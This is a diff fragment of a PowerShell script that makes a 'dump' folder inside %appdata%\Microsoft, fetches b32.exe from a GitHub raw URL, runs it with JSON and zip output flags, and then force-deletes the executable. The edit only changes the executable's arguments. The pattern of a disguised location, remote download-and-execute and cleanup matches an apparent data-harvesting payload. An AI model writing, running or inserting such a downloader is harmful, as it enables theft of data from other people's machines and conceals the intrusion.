@@ -5,7 +5,7 @@ mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing b.exe
 Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b32.exe'
-.\b32.exe --format json --zip true --dir .
+.\b32.exe --format json --zip true
 Remove-Item -Path "$env:appdata\Microsoft\dump\b32.exe" -Force
 $Random = Get-Random
 
